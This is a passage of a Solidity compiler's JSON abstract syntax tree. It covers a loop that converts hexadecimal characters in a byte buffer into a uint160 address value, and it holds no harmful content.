														"value": null,
														"visibility": "internal"
													}
												],
												"id": 425,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "3724:10:3"
											},
											{
												"assignments": [
													427
												],
												"declarations": [
													{
														"constant": false,
														"id": 427,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 580,
														"src": "3739:10:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 426,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "3739:7:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 428,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "3739:10:3"
											},
											{
												"body": {
													"id": 573,
													"nodeType": "Block",
													"src": "3795:471:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 446,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 444,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 420,
																	"src": "3801:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 445,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3810:3:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "3801:12:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 447,
															"nodeType": "ExpressionStatement",
															"src": "3801:12:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 458,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 448,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 424,
																	"src": "3819:2:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 453,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 413,
																						"src": "3838:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 455,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 454,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 430,
																						"src": "3842:1:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "3838:6:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 452,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "3832:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 451,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "3832:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 456,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "3832:13:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 450,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3824:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 449,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "3824:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 457,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3824:22:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "3819:27:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 459,
															"nodeType": "ExpressionStatement",
															"src": "3819:27:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 472,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 460,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 427,
																	"src": "3852:2:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 465,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 413,
																						"src": "3871:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 469,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 468,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 466,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 430,
																							"src": "3875:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 467,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "3879:1:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "3875:5:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "3871:10:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 464,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "3865:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 463,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "3865:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 470,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "3865:17:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 462,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3857:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 461,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "3857:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 471,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3857:26:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "3852:31:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 473,
															"nodeType": "ExpressionStatement",
															"src": "3852:31:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 482,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 476,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 474,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 424,
																				"src": "3894:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 475,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3900:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "3894:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 477,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "3893:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 480,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 478,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 424,
																				"src": "3908:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 479,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3914:3:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "3908:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 481,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "3907:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "3893:25:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 496,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 490,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 488,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 424,
																					"src": "3953:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 489,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3959:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "3953:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 491,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "3952:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 494,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 492,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 424,
																					"src": "3967:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 493,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3973:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "3967:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 495,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "3966:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "3952:24:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 510,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 504,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 502,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 424,
																						"src": "4011:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 503,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4017:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "4011:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 505,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "4010:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 508,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 506,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 424,
																						"src": "4025:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 507,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4031:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "4025:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 509,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "4024:10:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "4010:24:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 516,
																	"nodeType": "IfStatement",
																	"src": "4006:52:3",
																	"trueBody": {
																		"id": 515,
																		"nodeType": "Block",
																		"src": "4036:22:3",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 513,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 511,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 424,
																						"src": "4043:2:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 512,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "4049:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "4043:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 514,
																				"nodeType": "ExpressionStatement",
																				"src": "4043:8:3"
																			}
																		]
																	}
																},
																"id": 517,
																"nodeType": "IfStatement",
																"src": "3948:110:3",
																"trueBody": {
																	"id": 501,
																	"nodeType": "Block",
																	"src": "3978:22:3",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 499,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 497,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 424,
																					"src": "3985:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 498,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "3991:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "3985:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 500,
																			"nodeType": "ExpressionStatement",
																			"src": "3985:8:3"
																		}
																	]
																}
															},
															"id": 518,
															"nodeType": "IfStatement",
															"src": "3889:169:3",
															"trueBody": {
																"id": 487,
																"nodeType": "Block",
																"src": "3920:22:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 485,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 483,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 424,
																				"src": "3927:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 484,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3933:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "3927:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 486,
																		"nodeType": "ExpressionStatement",
																		"src": "3927:8:3"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 527,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 521,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 519,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 427,
																				"src": "4068:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 520,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4074:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "4068:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 522,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "4067:10:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 525,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 523,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 427,
																				"src": "4082:2:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 524,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "4088:3:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "4082:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 526,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "4081:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "4067:25:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 541,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 535,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 533,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 427,
																					"src": "4127:2:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 534,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "4133:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "4127:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
